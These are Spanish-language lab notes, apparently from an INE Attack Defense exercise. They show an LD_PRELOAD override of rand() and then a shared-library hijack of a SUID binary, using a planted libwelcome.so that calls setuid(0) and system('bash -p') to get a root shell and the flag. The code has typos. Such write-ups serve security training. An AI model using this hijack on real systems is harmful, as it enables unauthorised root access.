
Creamos con C el siguiente script

  `1   │ #include <stdio.h>`
   `2   │ #include <time.h>`
   `3   │ #include <stdlib.h>`
   `4   │` 
   `5   │ int main(int argc, char const *argv[]) {`
   `6   │   srand(time(NULL));`
   `7   │   printf("%d\n", rand());`
   `8   │ }`

ejecutamos `gcc random.c -o random`


Nos bajamos la herramienta uftrace de github
Seguimos las intrucciones de github para instalarlo

ejecutamos uftrace `ufrace --force -a random`

Nuestro random debe de coincidir con la firma

las firmas llevan la esctructura
Nombre  -> argumentos -> tipo de retorno

Hacemos
man 3 rand

Al ejecutar random el enlazador dinamico toma como prioritario aquello que lea con una variable que contenga LD_PRELOAD

creamos script
       │ File: test.c
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ int rand(void){
   2   │   return 42;
   3   │ }

Ejecutamos el siguiente comando:
	gcc -shared -fPIC test.c -o test

Como podemos observar es que a LD_PRELOAD
le cargamos test  al ejecutable random podemos alterar ese random


------------------------

Ya una vez sabiendo esto


Desplegaremos un laboratorio

Nos vamos a la pagina Attack Defense de INE

Library Chaos

Ojo: No se puede hacer secuestro de bibliotecas que esten enlazadas estaticamente

Encontramos un binario llamamado welcome
Al ejecutarlo da error
			Error loading shared library
utilizamos ldd `ldd /usr/bin/welcome`

veremos si tenemos capacitad de escritura en una ruta llamada

`ls -l /etc/ | grep "ld.so.conf.d"

vemos que el propietario es root pero otros no podemos escribir

nos metemos a la ruta

Vemos que hay un custom.conf
	cat custom.conf
	salida:
		home/student/lib
		
Nos vamos al directorio home
y vemos que no existe /lib (aunque salio que existia el directorio)
Hacemos ls -l /usr/bin/welcome
	Vemos que tiene privilegios SUID
	
***ANALIZANDO PODEMOS OBSERVAR QUE A LA HORA DE EJECUTAR WELCOME EN AUTOMATICO EJECUTA LA LIBRERIA /LIB/ CON COMANDO ROOT ESO SIGNIFICA QUE PODEMOS REEMPLAZAR O CREAR LA LIBRERIA /LIB/ CON UN SCRIPT DENTRO EN EL CUAL ELEVEMOS PRIVILEGIOS***

Entonces creamos nosotros el directorio /lib
	`mkdir lib`
`vi test.c`
-----------------------------------------------------------------------------------------

	`#include <stdio.h>`
	`#include <unistd.h>`

	`int welcome()`
		`seuit(0)`
		`setgid(0)`
		`system("bash -p")`
		`return 0;`
-------------------------

Hacemos un `gcc -fPIC -shared test.c -o libwelcome.so`
	Nos da un warning pero aun asi se crea
Vemos que aun no tenenemos el recurso libwelcome.so

pero si lo metemos al recurso lib
`mv welcome.so lib`

Ejecutamos el comando libwelcome.so
		Nos arroja error diciendo que no ha encontrado la palabra welcome entonces volvemos al codigo creado y modificamos ``int main a int welcome
Borramos y Repetimos los mismos pasos y

ahora hacemos welcome
	y hacemos whoami --> root
	Nos metemos a /root/ y conseguimos la flag

